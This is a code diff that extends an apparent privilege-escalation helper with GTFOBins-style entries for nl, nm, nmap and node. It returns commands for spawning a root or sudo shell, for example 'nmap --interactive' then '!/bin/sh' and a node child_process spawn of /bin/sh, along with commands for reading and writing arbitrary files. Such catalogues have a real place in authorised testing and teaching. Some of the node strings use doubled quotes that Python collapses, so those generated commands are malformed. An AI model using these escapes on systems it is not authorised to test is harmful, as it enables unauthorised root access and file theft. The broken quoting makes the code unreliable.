@@ -2635,6 +2635,41 @@ def gtfo_bins(gtfo_command, gtfo_options):
             bins.append("N/A")
         elif gtfo_options == "file-write":
             bins.append("N/A")
+    
+    elif gtfo_command == "nl":
+        if gtfo_options == "file-read":
+            bins.append("nl -bn -w1 -s '' /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "nm":
+        if gtfo_options == "file-read":
+            bins.append("nm /path/to/input-file")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "nmap":
+        if gtfo_options == "shell":
+            bins.append("nmap --interactive\n!/bin/sh")
+        elif gtfo_options == "file-write":
+            bins.append("nmap -oG=/path/to/output-file DATA")
+        elif gtfo_options == "file-read":
+            bins.append("nmap -iL /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "node":
+        if gtfo_options == "shell":
+            bins.append("node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'")
+        elif gtfo_options == "file-read":
+            bins.append('node -e ''process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'"")
+        elif gtfo_options == "file-write":
+            bins.append("node -e "'require("fs").writeFileSync("/path/to/output-file", "DATA")'"")
+        elif gtfo_options == "sudo":
+            bins.append("node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'")
+        else:
+            bins.append("N/A")
+
 
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
@@ -2679,7 +2714,7 @@ def main():
         "mail", "make", "man", "mawk", "minicom", "more", "mosquitto", "mount",
         "msfconsole", "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge",
         "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
-        "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "other",
+        "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", "node", "other",
     }
 
     if start in ALLOWED:
